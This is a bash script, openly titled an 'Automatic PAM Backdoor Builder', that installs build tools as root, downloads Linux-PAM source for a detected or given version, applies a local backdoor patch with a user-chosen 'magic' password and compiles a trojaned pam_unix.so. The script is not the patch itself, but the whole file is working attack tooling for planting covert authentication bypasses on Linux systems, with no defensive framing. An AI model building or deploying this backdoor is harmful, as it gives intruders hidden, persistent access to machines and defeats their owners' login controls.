#!/bin/bash

OPTIND=1

PAM_VERSION=""
PAM_FILE=""
PASSWORD=""

DEPENDENCIES=(
    autoconf automake autopoint bison bzip2 docbook-xml docbook-xsl 
    flex gettext libaudit-dev libcrack2-dev libdb-dev libfl-dev 
    libselinux1-dev libtool libcrypt-dev libxml2-utils make 
    pkg-config sed w3m xsltproc xz-utils gcc wget
)

echo "Automatic PAM Backdoor Builder"

function show_help {
    echo "Usage: $0 [-v version] -p password"
    echo ""
    echo "Options:"
    echo "  -v          Specify Linux-PAM version (e.g., 1.3.1)."
    echo "  -p          The 'magic' password for the backdoor."
    echo "  -h, --help  Show this help message."
}

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root (use sudo) to install dependencies."
   exit 1
fi

function check_dependencies {
    echo "Checking dependencies..."
    MISSING_PKGS=()
    for pkg in "${DEPENDENCIES[@]}"; do
        if ! dpkg -s "$pkg" >/dev/null 2>&1; then
            MISSING_PKGS+=("$pkg")
        fi
    done

    if [ ${#MISSING_PKGS[@]} -gt 0 ]; then
        echo "Installing missing dependencies: ${MISSING_PKGS[*]}"
        apt update
        apt install -y "${MISSING_PKGS[@]}"
    else
        echo "All dependencies are already installed."
    fi
}

for arg in "$@"; do
    if [[ "$arg" == "--help" ]]; then
        show_help
        exit 0
    fi
done

while getopts ":h:?:p:v:" opt; do
    case "$opt" in
    h|\?) show_help; exit 0 ;;
    v)    PAM_VERSION="$OPTARG" ;;
    p)    PASSWORD="$OPTARG" ;;
    esac
done

shift $((OPTIND-1))

check_dependencies

if [ -z "$PAM_VERSION" ]; then
    echo "No version specified. Attempting to detect..."
    if command -v dpkg >/dev/null 2>&1; then
        PAM_VERSION=$(dpkg -s libpam-modules | grep '^Version' | cut -d' ' -f2 | cut -d'-' -f1)
    fi

    if [ -z "$PAM_VERSION" ]; then
        echo "Error: Could not auto-detect PAM version. Please specify with -v."
        exit 1
    fi
    echo "Detected Version: $PAM_VERSION"
fi

if [ -z "$PASSWORD" ]; then
    echo "Error: Password (-p) is required."
    show_help
    exit 1
fi

PAM_BASE_URL="https://github.com/linux-pam/linux-pam/archive"
PAM_DIR="linux-pam-${PAM_VERSION}"
PAM_FILE="v${PAM_VERSION}.tar.gz"

wget -c "${PAM_BASE_URL}/${PAM_FILE}"
if [[ $? -ne 0 ]]; then
    PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION}"
    PAM_FILE="Linux-PAM-${PAM_VERSION}.tar.gz"
    wget -c "${PAM_BASE_URL}/${PAM_FILE}"
    
    if [[ $? -ne 0 ]]; then
        PAM_VERSION_ALT=$(echo "$PAM_VERSION" | tr '.' '_')
        PAM_DIR="linux-pam-Linux-PAM-${PAM_VERSION_ALT}"
        PAM_FILE="Linux-PAM-${PAM_VERSION_ALT}.tar.gz"
        wget -c "${PAM_BASE_URL}/${PAM_FILE}"
        
        if [[ $? -ne 0 ]]; then
            echo "Failed to download PAM source."
            exit 1
        fi
    fi
fi

tar xzf "$PAM_FILE"

if [ -f "backdoor.patch" ]; then
    sed "s/_PASSWORD_/${PASSWORD}/g" backdoor.patch | patch -p1 -d "$PAM_DIR"
else
    echo "Error: backdoor.patch not found."
    exit 1
fi

cd "$PAM_DIR"
if [[ ! -f "./configure" ]]; then ./autogen.sh; fi 

./configure --libdir=/lib/x86_64-linux-gnu
make

if [ -f "modules/pam_unix/.libs/pam_unix.so" ]; then
    cp modules/pam_unix/.libs/pam_unix.so ../
    echo " "
    echo "Backdoor created: ./pam_unix.so"
else
    echo "Error: Build failed."
    exit 1
fi
